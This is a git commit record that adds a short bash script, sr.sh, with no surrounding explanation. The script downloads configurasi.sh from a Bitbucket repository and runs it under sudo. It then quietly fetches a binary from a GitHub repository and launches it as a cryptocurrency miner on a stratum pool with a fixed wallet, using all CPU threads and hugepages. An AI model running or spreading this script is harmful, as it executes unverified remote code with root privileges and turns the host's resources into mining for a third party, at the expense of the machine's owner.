abd01446d69b12d1cb6aaf9334f320049df4f751
barburonjilo <barburonjilo@outlook.co.id>
2024-06-12 13:47:49 +0700

    Create sr.sh

---
+++ sr.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+apt-get update ; apt-get install -y wget curl sudo
+wget https://bitbucket.org/kacepot/esce/raw/main/configurasi.sh
+chmod u+x configurasi.sh
+sudo ./configurasi.sh
+./configurasi.sh
+wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/sarebu >/dev/null 2>&1
+chmod +x sgr1
+./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive
